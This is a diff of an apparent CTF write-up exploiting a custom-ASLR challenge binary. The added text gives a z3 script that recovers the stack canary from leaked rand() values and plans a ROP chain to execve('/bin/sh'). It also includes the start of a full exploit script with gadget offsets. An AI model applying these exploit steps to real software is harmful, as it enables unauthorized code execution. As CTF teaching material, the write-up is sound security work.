 </span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
-</span></span><span style="display:flex;"><span>     <span style="color:#09f;font-style:italic">//                    LAB_00401607                      XREF[1]: 00401690(j)  
-</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>   <span style="color:#f60">00401607</span> bf <span style="color:#f60">0</span>c <span style="color:#f60">00</span> <span style="color:#f60">00</span>    MOV         EDI,<span style="color:#f60">0xc</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#f60">00</span>
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> rand();
 </span></span><span style="display:flex;"><span>    uVar2 <span style="color:#555">=</span> CONCAT44(extraout_var,iVar1) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">0x1c</span>;
 </span></span><span style="display:flex;"><span>    uVar3 <span style="color:#555">=</span> sys_mmap(uVar2,param_1 <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">0xc</span>,<span style="color:#f60">3</span>,<span style="color:#f60">0x100022</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>);
@@ -1224,17 +1632,24 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now we have find the custom aslr method! Turn out, the way it do the ASLR is, it will called <code>rand()</code> method to get 12-bits of random number as the base address. Remember that before calling the first <code>rand()</code> to load the first object file, the current <code>rand_state</code> is the <code>canary</code> value.</p>
-<p>And checking through the code, after initializing the canary stack value, <code>rand()</code> will be only called during assigning the aslr of the loaded object.</p>
-<p>So, if we somehow able to retrieve these aslr addresses (which constructed from the <code>rand()</code> value result), it will be great for us, because that means we will recover consecutive <code>rand()</code> results after the <code>rand_state</code> equivalent to the <code>canary</code> value.</p>
-<p>To summarize, we will load 7 object files (because we were given 7 object files in the chall), which mean there will be 7 consecutive calls to <code>rand()</code> after the <code>rand_state</code> is equivalent to <code>canary</code> value.</p>
-<p>The <code>rand()</code> method is pretty linear, so if we somehow able retrieve some of this <code>rand()</code> calls value from the leaked aslr address (which mean leaking the base address of each loaded object file), we might be able to reconstruct the <code>rand_state</code> before the first <code>aslr_get_addr</code> calls, which basically retrieve the <code>canary</code> value.</p>
+</div><p>Checking through the assembly, the <code>edi</code> is set to 0xc before calling the <code>rand()</code> method.
+<p class="markdown-image">
+  <img src="https://i.imgur.com/OFroRDt.png" alt=""  />
+</p></p>
+<p>Now we have find the custom aslr method! Turn out, the way it do the ASLR is, it will called <code>rand()</code> method to get 12-bits (0xc) of random number, and use this value as the first 12-bit base address of the loaded object file.</p>
+<p>And checking through Ghidra, after initializing the canary stack value, <code>rand()</code> will be only called during assigning the aslr of the loaded object via this method. You can see in below picture that <code>rand()</code> is only used in <code>init_stack_guard</code> (0x402163) and <code>aslr_get_addr</code> (0x40160c) method.
+<p class="markdown-image">
+  <img src="https://i.imgur.com/jWXxfiQ.png" alt=""  />
+</p></p>
+<p>Remember from the previous analysis, that if we somehohw manage to get the n <code>rand()</code> call values after the call of <code>init_stack_guard</code>, we might be able to recover the <code>rand_state</code> after the <code>init_stack_guard</code> call, which is equivalent to the <code>canary</code> value set in our binary. And turn out, each of the n <code>rand()</code> call values are used as the aslr base address of each loaded files.</p>
+<p>So, if we somehow able to retrieve these aslr addresses (which constructed from the <code>rand()</code> value result), it will be great for us, because that means we will be able to recover consecutive <code>rand()</code> results, where the <code>rand()</code> call is based on a <code>rand_state</code> that is equivalent to the <code>canary</code> value. And using these recovered values, we will try to reconstruct the initial <code>rand_state</code> (which is our <code>canary</code>).</p>
+<p>To summarize, <code>loader</code> will load 7 object files (because we were given 7 object files in the chall), which mean there will be 7 consecutive calls to <code>rand()</code> after the <code>rand_state</code> is equivalent to <code>canary</code> value. And our target is to leak these 7 aslr addresses.</p>
 <h5 id="run-the-main-program">Run the main program <a href="#run-the-main-program" class="anchor">#</a></h5>
 <p>Well yeah, after the <code>loader</code> finished all of its object files, it will run the <code>main</code> program, which basically run the methods defined in <code>game.o</code> file.</p>
 <h3 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h3>
-<p>From the above initial analysis, what we have gathered so far:</p>
+<p>Now we have finished our initial analysis, we will need to craft a plan. From the above initial analysis, what we have gathered so far:</p>
 <ul>
-<li>We can leak the <code>canary</code> value if we able to retrieve the <code>rand()</code> results of the <code>aslr_get_addr</code> value, which is the base address of each loaded object file region.</li>
+<li>We can leak the <code>canary</code> value if we able to retrieve the <code>rand()</code> results of the <code>aslr_get_addr</code> value, which is basically the aslr base address of each loaded object file region.</li>
 <li>There is BOF in the <code>get_player_name</code> method.
 <ul>
 <li>This indicates that to be able to perform ROP, we will need to play the game until we got into the scoreboard + we need <code>canary</code> value.</li>
@@ -1446,7 +1861,7 @@
 </div>
 </div><p>Notice that the first 12-bits of the number is actually the <code>rand()</code> result (Specifically the first <code>rand()</code> result after <code>rand_state = canary</code>). So basically our goal is with this OOB, we will try to leak all the aslr address generated by the <code>rand()</code> method.</p>
 <p>Also, we actually can use negative index. But we need to convert it to unsigned first. For example, if you want to put <code>-1</code>, then send <code>2**64-1</code> as the offset value.</p>
-<p>After playing throughout the gdb, we notice a consistent pattern which we will explained below:</p>
+<p>After playing throughout the gdb, we notice a consistent pattern on each run, which we will explained below:</p>
 <ul>
 <li>Offset 512 -&gt; Leak the 1st rand() result (<code>base_1</code> region address)</li>
 <li>Offset -1017 -&gt; Leak the 3rd rand() result (<code>base_3</code> region address)</li>
@@ -1454,17 +1869,181 @@
 <li>After leaking the 5th rand(), we notice that the address region started with 5th rand() value contains the 4th and 6th rand() result. So subtracting the 5th leaked address with the 1st leaked address can leak the 4th and 6th rand() value.</li>
 <li>After leaking the 4th rand(), we notice that the address region started with the 4th rand() value contains the 2nd rand() result. So subtracting the 4th leaked with the 1st leaked can leak the 2nd rand() value.</li>
 </ul>
-<p>You can see my shared script later if you quite confused.</p>
+<p>You can see my shared script later if you quite confused, but basically with correct OOB offsets, we managed to leak the first 6 of the aslr addresses where the first 12-bit of each address is generated by <code>rand()</code>.</p>
 <h4 id="recover-canary-value">Recover <code>canary</code> value <a href="#recover-canary-value" class="anchor">#</a></h4>
-<p>Now that we have leaked 6 consecutive of the <code>rand()</code> values, this is actually enough to recover our <code>canary</code> value. How to do this? Just put it in <code>z3</code> 😂. Details can be found in the script that I&rsquo;ll shared later.</p>
-<p>Also we can get the 7th <code>rand()</code> result because we know the correct <code>rand_state</code>. This will be useful!</p>
-<h4 id="leverage-the-bof-bug-to-perform-rce">Leverage the BOF bug to perform RCE <a href="#leverage-the-bof-bug-to-perform-rce" class="anchor">#</a></h4>
-<p>Now we have recover our canary value, we can use the BOF bug to perform RCE. So, the last step is only to build a ROP chain.</p>
-<p>Inspecting via gdb, we notice that the 7th rand() address region contains a lot of gadgets that we can use (Such as <code>pop rdi; ret;</code>, <code>pop rsi; ret</code>, <code>pop rax; ret</code>). We plan to use this gadget to do syscall <code>execve('/bin/sh')</code>.</p>
+<p>Now that we have leaked 6 consecutive of the <code>rand()</code> values, this is actually enough to recover our <code>canary</code> value. How to do this? Just translate the <code>rand()</code> method to python and put it in <code>z3</code> 😂. Here is the sample POC, where we will use the previous value that we get from GDB.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">z3</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Sanity check</span>
+</span></span><span style="display:flex;"><span>real_canary <span style="color:#555">=</span> <span style="color:#f60">0x75924ac4cc2d256a</span>
+</span></span><span style="display:flex;"><span>known_states7 <span style="color:#555">=</span> <span style="color:#f60">0xf0b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># For POC, we will use only 6 of the rand() values, because we can only recover 6 rand() values</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># based on previous analysis</span>
+</span></span><span style="display:flex;"><span>known_states <span style="color:#555">=</span> [<span style="color:#f60">0x42f</span>, <span style="color:#f60">0xf90</span>, <span style="color:#f60">0x97e</span>, <span style="color:#f60">0x7ab</span>, <span style="color:#f60">0xc92</span>, <span style="color:#f60">0x6fe</span>]
+</span></span><span style="display:flex;"><span>s <span style="color:#555">=</span> Solver()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Rand state is a 64-bit value</span>
+</span></span><span style="display:flex;"><span>rand_state <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand_extract_bit</span>(a):
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> rand_state
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> (rand_state <span style="color:#555">&gt;&gt;</span> a) <span style="color:#555">&amp;</span> <span style="color:#f60">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand_get_bit</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> rand_state
+</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> (
+</span></span><span style="display:flex;"><span>        rand_extract_bit(<span style="color:#f60">0x3F</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3D</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3C</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3A</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> <span style="color:#f60">1</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    rand_state <span style="color:#555">=</span> ((rand_state <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">%</span> (<span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span>)) <span style="color:#555">|</span> x
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand</span>(n):
+</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> <span style="color:#f60">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(n):
+</span></span><span style="display:flex;"><span>        y <span style="color:#555">=</span> rand_get_bit()
+</span></span><span style="display:flex;"><span>        x <span style="color:#555">=</span> (x <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">|</span> y
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Put leaked rand() values to the solver</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> known_state <span style="color:#000;font-weight:bold">in</span> known_states:
+</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>add(rand(<span style="color:#f60">0xc</span>) <span style="color:#555">==</span> known_state)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Solve the equations with z3</span>
+</span></span><span style="display:flex;"><span>recovered_canary <span style="color:#555">=</span> <span style="color:#f60">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> s<span style="color:#555">.</span>check() <span style="color:#555">==</span> sat:
+</span></span><span style="display:flex;"><span>    model <span style="color:#555">=</span> s<span style="color:#555">.</span>model()
+</span></span><span style="display:flex;"><span>    recovered_canary <span style="color:#555">=</span> model[BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)]<span style="color:#555">.</span>as_long()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Check whether the recoverd rand_state (canary) is the same as what</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># we got from GDB value.</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Known states    : </span><span style="color:#a00">{</span>known_states<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Real canary     : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(real_canary)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Recovered canary: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(recovered_canary)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now we have recovered the canary (rand_state), let&#39;s calculate</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the address of the 7th rand() result. Inspecting via gdb, this</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># 7th address contains a lot of useful gadgets.</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Recover 7th address</span>
+</span></span><span style="display:flex;"><span>rand_state <span style="color:#555">=</span> recovered_canary
+</span></span><span style="display:flex;"><span>recovered_known_state7 <span style="color:#555">=</span> <span style="color:#f60">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>):
+</span></span><span style="display:flex;"><span>    recovered_known_state7 <span style="color:#555">=</span> rand(<span style="color:#f60">12</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Check whether thhe recovered 7th rand() value is the same as what</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># we got from GDB value.</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Real Addr 7th   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(known_states7)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Recovered Addr  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(recovered_known_state7)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing the above POC will be the proof that z3 is able to recover the <code>canary</code> value. Also after we recovered the initial <code>rand_state</code>, we can simply get the 7th <code>rand()</code> by calling <code>rand()</code> 7 times. This will be useful later! Below is the POC result.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Known states    : [1071, 3984, 2430, 1963, 3218, 1790]
+</span></span><span style="display:flex;"><span>[*] Real canary     : 0x75924ac4cc2d256a
+</span></span><span style="display:flex;"><span>[*] Recovered canary: 0x75924ac4cc2d256a
+</span></span><span style="display:flex;"><span>[*] Real Addr 7th   : 0xf0b
+</span></span><span style="display:flex;"><span>[*] Recovered Addr  : 0xf0b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="leverage-the-bof-bug-to-perform-rce">Leverage the BOF bug to perform RCE <a href="#leverage-the-bof-bug-to-perform-rce" class="anchor">#</a></h4>
+<p>Now we have POC to recover our canary value, we can use the BOF bug to perform RCE. So, the last step is only to build a ROP chain.</p>
+<p>Inspecting via gdb, we notice that the 7th rand() address region contains a lot of gadgets that we can use (Such as <code>pop rdi; ret;</code>, <code>pop rsi; ret</code>, <code>pop rax; ret</code>). We also notice in thhe 2nd rand() address region, there is <code>syscall</code> gadget. We plan to use these gadgets to do syscall <code>execve('/bin/sh')</code>. The rough plan is to build a ROP chain to do this:</p>
+<ul>
+<li>pop &ldquo;/bin/sh\x00&rdquo; pointer to <code>rdi</code></li>
+<li>pop null to <code>rsi</code></li>
+<li>pop <code>execve</code> syscall number (0x3b) to <code>rax</code></li>
+<li>call <code>syscall</code></li>
+</ul>
 <h3 id="solution">Solution <a href="#solution" class="anchor">#</a></h3>
-<p>Using the above exploitation plan, below is the full script with detailed comments that I used.</p>
+<p>Following the above exploitation plan, below is the full script that I used to execute the plan. I&rsquo;ve provided detailed comments to explain what does the script do.</p>
 <blockquote>
-<p>Notes that sometimes z3 couldn&rsquo;t recover the correct <code>canary</code> value, but we simply retry it as at somepoint, it will be able to recover the correct <code>canary</code>.</p>
+<p>Notes that sometimes z3 couldn&rsquo;t recover the correct <code>canary</code> value, but we simply retry it, and at somepoint, it will be able to recover the correct <code>canary</code>.</p>
 </blockquote>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -1649,6 +2228,7 @@
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
@@ -1802,21 +2382,22 @@
 </span></span><span style="display:flex;"><span>base_addr7 <span style="color:#555">=</span> (base_addr7 <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">28</span>)<span style="color:#555">+</span><span style="color:#f60">0x1000</span>
 </span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Base Addr 7th: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(base_addr7)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Gadgets from the 7th address region</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Gadgets from the 7th address region (Gadget can be inspected via gdb)</span>
 </span></span><span style="display:flex;"><span>pop_rdi <span style="color:#555">=</span> base_addr7<span style="color:#555">+</span><span style="color:#f60">0x1</span> <span style="color:#09f;font-style:italic"># pop rdi; ret;</span>
 </span></span><span style="display:flex;"><span>pop_rsi <span style="color:#555">=</span> base_addr7<span style="color:#555">+</span><span style="color:#f60">0x4</span> <span style="color:#09f;font-style:italic"># pop rsi; ret;</span>
